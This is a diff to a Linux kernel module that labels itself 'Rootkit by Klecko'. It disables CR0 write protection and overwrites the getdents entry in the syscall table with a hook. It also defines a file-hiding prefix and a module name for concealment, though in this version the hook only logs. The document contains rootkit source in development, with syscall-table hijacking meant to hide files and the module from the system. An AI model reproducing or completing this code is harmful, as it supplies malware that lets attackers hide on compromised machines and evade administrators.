@@ -4,28 +4,46 @@
 #include <linux/unistd.h> // __NR_syscall
 #include <asm/paravirt.h> // write_cr0
 
-#include "helper.h"
+//#include "helper.h"
 
 #define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
 #define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));
+#define HIDE_PREFIX		"jordans_secrets."
+#define HIDE_PREFIX_SZ		(sizeof(HIDE_PREFIX) - 1)
+#define MODULE_NAME		"superhide"
+#define MODULE_NAME_SZ		(sizeof(MODULE_NAME) - 1)
+#define GETDENTS_SYSCALL_NUM	78
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Klecko");
 MODULE_DESCRIPTION("Rootkit by Klecko");
 MODULE_VERSION("0.1");
 
+struct linux_dirent {
+	unsigned long	d_ino;
+	unsigned long	d_off;
+	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
+	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
+};
 
 //void** syscall_table;
 unsigned long *syscall_table = NULL;
 
-//typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
-//sys_getdents_t original_sys_getdents = NULL;
+typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
+sys_getdents_t sys_getdents_orig = NULL;
 
-asmlinkage long (*original_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
-asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
+asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
+	long ret = sys_getdents_orig(fd, dirent, count);
 	printk(KERN_INFO "ROOTKIT Hello from sys_getdents\n");
-	return original_sys_getdents(fd, dirent, count);
+	return ret;
 }
+
+//asmlinkage long (*original_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
+//asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
+//	printk(KERN_INFO "ROOTKIT Hello from sys_getdents\n");
+//	return original_sys_getdents(fd, dirent, count);
+//}
 
 asmlinkage long (*original_sys_stat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
 asmlinkage long sys_stat_hook(const char __user *filename, struct __old_kernel_stat __user *statbuf){
@@ -62,6 +80,8 @@ int __init hooks(void){
 	ENABLE_WRITE();
 	//original_sys_getdents = (void*)syscall_table[__NR_getdents]; // OJO CASTING
 	//syscall_table[__NR_getdents] = &sys_getdents_hook;
+	sys_getdents_orig = (sys_getdents_t)((void**)syscall_table)[GETDENTS_SYSCALL_NUM];
+	syscall_table[GETDENTS_SYSCALL_NUM] = sys_getdents_new;
 
 	//real_execve = (void*)syscall_table[__NR_execve];
 	//syscall_table[__NR_execve] = &new_execve;
@@ -69,8 +89,8 @@ int __init hooks(void){
 	//original_sys_stat = (void*)syscall_table[__NR_stat];
 	//syscall_table[__NR_stat] = &sys_stat_hook;
 
-	original_sys_clone = (void*)syscall_table[__NR_clone];
-	syscall_table[__NR_clone] = &sys_clone_hook;
+	//original_sys_clone = (void*)syscall_table[__NR_clone];
+	//syscall_table[__NR_clone] = &sys_clone_hook;
 	DISABLE_WRITE();
 
 	printk(KERN_INFO "ROOTKIT Finished hooks\n");
